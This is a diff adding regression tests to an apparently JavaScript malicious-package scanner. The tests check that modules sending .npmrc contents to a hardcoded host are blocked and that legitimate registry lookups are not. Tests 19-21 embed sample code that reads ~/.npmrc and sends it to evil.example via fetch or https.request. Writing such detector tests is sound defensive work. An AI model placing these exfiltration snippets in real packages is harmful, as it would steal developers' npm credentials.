@@ -329,6 +329,115 @@ test('Word list containing "stratum"/"substratum"/"stratus" is not flagged as a 
   assert.strictEqual(result.detections.length, 0, `Expected no detections but got: ${JSON.stringify(result.detections)}`);
 });
 
+// 19. F-30 redo: whole-.npmrc exfil, no token field name ever appears (regression guard)
+// The first cut of F-30 gated escalation on the literal string `_authToken` appearing in the
+// module. Real .npmrc-stealers don't bother parsing the file -- they just read the whole
+// thing and ship it. That variant never named a token field and slipped through as WARN.
+// The discriminator that holds is the destination (hardcoded vs. built from config), not
+// whether a field name is parsed out of the file.
+test('F-30 redo: whole .npmrc read + hardcoded exfil URL is blocked (no _authToken string present)', () => {
+  const src = pad(`
+    const fs = require('fs');
+    const os = require('os');
+    const t = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
+    fetch('http://evil.example/c?d=' + t);
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('npmrc-whole-exfil.js', src, 'npmrc-whole-exfil.js');
+  expectBlocked(result);
+  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
+  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
+  assert.strictEqual(credExfil.severity, 'CRITICAL');
+});
+
+// 20. F-30 redo: .npmrc contents as a POST body to a hardcoded host (regression guard)
+test('F-30 redo: .npmrc read + POST body to a hardcoded host is blocked', () => {
+  const src = pad(`
+    const fs = require('fs');
+    const t = fs.readFileSync('.npmrc', 'utf8');
+    https.request('https://evil.example/collect', { method: 'POST' }).end(t);
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('npmrc-post-exfil.js', src, 'npmrc-post-exfil.js');
+  expectBlocked(result);
+  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
+  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
+  assert.strictEqual(credExfil.severity, 'CRITICAL');
+});
+
+// 21. F-30 redo: _authToken extraction redirected via an explicit {host:...} override (regression guard)
+test('F-30 redo: .npmrc _authToken extraction with a {host: ...} override is blocked', () => {
+  const src = pad(`
+    const fs = require('fs');
+    const cfg = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
+    const m = cfg.match(/_authToken=(.+)/);
+    https.request({ host: 'evil.example', path: '/c' }).end(m[1]);
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('npmrc-token-host-exfil.js', src, 'npmrc-token-host-exfil.js');
+  expectBlocked(result);
+  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
+  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
+  assert.strictEqual(credExfil.severity, 'CRITICAL');
+});
+
+// 22. F-30 redo: legit npm tooling builds the URL from config, not blocked (regression guard)
+test('F-30 redo: npm tooling reading .npmrc to resolve the registry, then fetching from config, is not blocked', () => {
+  const src = pad(`
+    const path = require('path');
+    const os = require('os');
+    const fs = require('fs');
+    const p = path.join(os.homedir(), '.npmrc');
+    const content = fs.readFileSync(p, 'utf8');
+    const match = content.match(/^\\s*registry\\s*=\\s*(.+)/m);
+    const registry = match ? match[1].trim() : 'https://registry.npmjs.org';
+    const response = await fetch(\`\${registry}/\${name}\`);
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('npmrc-legit-config-url.js', src, 'npmrc-legit-config-url.js');
+  const hardBlock = result.detections.find(d => !d.warnOnly);
+  assert.ok(!hardBlock, `Legit npm tooling must not hard-block. Got: ${JSON.stringify(hardBlock)}`);
+});
+
+// 23. F-30 redo: hardcoded 'https://registry.npmjs.org' as a fallback DEFAULT next to a
+// config-driven fetch must not false-positive (regression guard for a gap found in review of
+// the F-30 redo itself: an earlier draft of this fix matched "any quoted absolute URL
+// anywhere in the file", which caught this exact fallback-default idiom and would have
+// wrongly blocked it). The fix anchors HARDCODED_EGRESS_CALL to the network-call argument
+// itself, so a literal sitting in an unrelated assignment doesn't count.
+test('F-30 redo: hardcoded registry.npmjs.org fallback default (not the actual fetch target) is not blocked', () => {
+  const src = pad(`
+    const fs = require('fs');
+    const content = fs.readFileSync('.npmrc', 'utf8');
+    const match = content.match(/^\\s*registry\\s*=\\s*(.+)/m);
+    const registry = match ? match[1].trim() : 'https://registry.npmjs.org';
+    const response = await fetch(\`\${registry}/\${name}\`);
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('npmrc-fallback-default.js', src, 'npmrc-fallback-default.js');
+  const hardBlock = result.detections.find(d => !d.warnOnly);
+  assert.ok(!hardBlock, `Fallback-default constant must not hard-block. Got: ${JSON.stringify(hardBlock)}`);
+});
+
+// 24. F-30 redo: hardcoded call-site fetch of the REAL npm registry is WARN, not a hard block
+// (regression guard). Some legit tools hardcode registry.npmjs.org directly at the call site
+// instead of building it from config -- indistinguishable from theft by "hardcoded
+// destination" alone. Policy: soften to WARN specifically for registry.npmjs.org; any other
+// hardcoded host still blocks (see tests 19-21).
+test('F-30 redo: hardcoded fetch of registry.npmjs.org itself is WARN, not a hard block', () => {
+  const src = pad(`
+    const fs = require('fs');
+    const content = fs.readFileSync('.npmrc', 'utf8');
+    const response = await fetch('https://registry.npmjs.org/' + name);
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('npmrc-hardcoded-real-registry.js', src, 'npmrc-hardcoded-real-registry.js');
+  const hardBlock = result.detections.find(d => !d.warnOnly);
+  assert.ok(!hardBlock, `Hardcoded fetch of the real npm registry must not hard-block. Got: ${JSON.stringify(hardBlock)}`);
+  const warnDetection = result.detections.find(d => d.rule === 'NPMRC_NETWORK_EGRESS');
+  assert.ok(warnDetection, `Expected NPMRC_NETWORK_EGRESS WARN detection but got: ${JSON.stringify(result.detections)}`);
+});
+
 // ─── report ──────────────────────────────────────────────────────────────────
 
 console.log('\n═══════════════════════════════════════════════════════════════');
